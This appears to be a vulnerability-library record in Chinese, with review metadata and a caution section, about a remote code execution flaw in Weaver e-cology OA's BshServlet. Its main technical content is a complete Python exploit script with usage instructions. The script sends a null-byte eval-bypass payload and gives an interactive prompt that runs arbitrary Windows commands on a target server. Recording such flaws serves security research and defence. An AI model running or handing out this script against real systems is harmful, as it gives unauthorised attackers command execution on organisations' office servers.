---
source: "Mr-xn/Penetration_Testing_POC"
title: "泛微e-cology BshServlet命令执行脚本"
product: "泛微e-cology"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "包括但不限于7/8/8.1；Windows cmd /c固定"
prerequisites: "声称易受影响，脚本无凭证"
side_effects: "命令/代码执行示例可能改变主机状态"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/OA%E5%8A%9E%E5%85%AC/%E6%B3%9B%E5%BE%AEoa/%E6%B3%9B%E5%BE%AEOA%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9FRCE%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC.md"
id: "vw-c4a1bbd25ca2821b66af2baa"
entity_id: "ve-c4a1bbd25ca2821b66af2baa"
schema_version: "1"
---

# 泛微e-cology BshServlet命令执行脚本

## 条目说明

- 对象与具体问题：泛微e-cology；BshServlet命令执行脚本
- 版本、配置及部署条件：包括但不限于7/8/8.1；Windows cmd /c固定
- 认证与权限前提：声称易受影响，脚本无凭证
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 同BshServlet根因和eval绕过，独立交互脚本可放附录不应另建漏洞
- 脚本固定Windows命令环境未在版本条件列明；只是输出响应而非确认检测
- 泛化标题和重复危害段/产品宣传可压缩；缺补丁和实际响应

## 操作风险

命令/代码执行示例可能改变主机状态。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 前言  

泛微e-cology OA远程代码执行|泛微OA管理系统RCE漏洞利用脚本

### 漏洞简介  

泛微OA管理系统RCE漏洞：攻击者可通过精心构造的请求包攻击易受损的泛微OA用户，实现任意代码执行，进而获取系统Shell。企业用户可以使用腾讯御知检测企业网络资产是否存在该漏洞。

### 漏洞危害  

攻击者可通过精心构造的请求包攻击易受损的泛微OA用户，实现任意代码执行，进而获取系统Shell

### 影响范围  

#### 产品  

> 泛微e-cology

#### 版本  

> 包括不限于7.0，8.0，8.1版  

#### 组件  

> 泛微e-cology  

### 漏洞复现  

```python
import requests
import sys

headers = {
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 12_10) AppleWebKit/600.1.25 (KHTML, like Gecko) Version/12.0 Safari/1200.1.25',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'Accept-Language': 'zh-CN,zh;q=0.9',
    'Content-Type': 'application/x-www-form-urlencoded'
}


def exploit(url,cmd):
    target=url+'/weaver/bsh.servlet.BshServlet'
    payload='bsh.script=eval%00("ex"%2b"ec(\\"cmd+/c+{}\\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw'.format(cmd)
    res=requests.post(url=target,data=payload,headers=headers,timeout=10)
    res.encoding=res.apparent_encoding
    print(res.text)

if __name__ == '__main__':
    url=sys.argv[1]
    while(1):
        cmd=input('cmd:')
        exploit(url,cmd)
```
USAGE：python e-cology-rce.py http://target.com/ 根据提示输入需要执行的命令即可检测


---

> 来源：Mr-xn/Penetration_Testing_POC
